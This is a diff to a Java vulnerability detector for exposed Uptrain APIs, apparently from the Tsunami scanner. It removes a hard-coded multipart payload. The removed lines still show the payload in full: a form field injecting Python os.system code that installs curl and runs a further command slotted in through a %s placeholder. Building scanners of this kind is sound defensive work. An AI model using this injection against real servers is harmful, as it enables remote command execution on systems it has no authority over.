@@ -23,7 +23,6 @@ import static com.google.common.net.HttpHeaders.USER_AGENT;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 
-import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.common.util.concurrent.Uninterruptibles;
@@ -78,61 +77,6 @@ public class UptrainExposedApiDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private final PayloadGenerator payloadGenerator;
-
-  @VisibleForTesting
-  static final String PAYLOAD =
-      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"model\"\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "gpt-3.5-turbo\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"project_name\"\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "asdf\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"checks\"\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "__import__(\\'os\\').system(\\'apt update && apt install curl -y && %s')\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"dataset_name\"\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "asdf\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"data_file\"; filename=\"test.jsonl\"\r"
-          + "\n"
-          + "Content-Type: application/octet-stream\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r"
-          + "\n"
-          + "Content-Disposition: form-data; name=\"metadata\"\r"
-          + "\n"
-          + "\r"
-          + "\n"
-          + "{\"gpt-3.5-turbo\":{\"openai_api_key\":\"asdf\"}}\r"
-          + "\n"
-          + "------WebKitFormBoundarysFz2W1h9iMH4IFs9--\r"
-          + "\n";
 
   private final HttpClient httpClient;
   private final Clock utcClock;
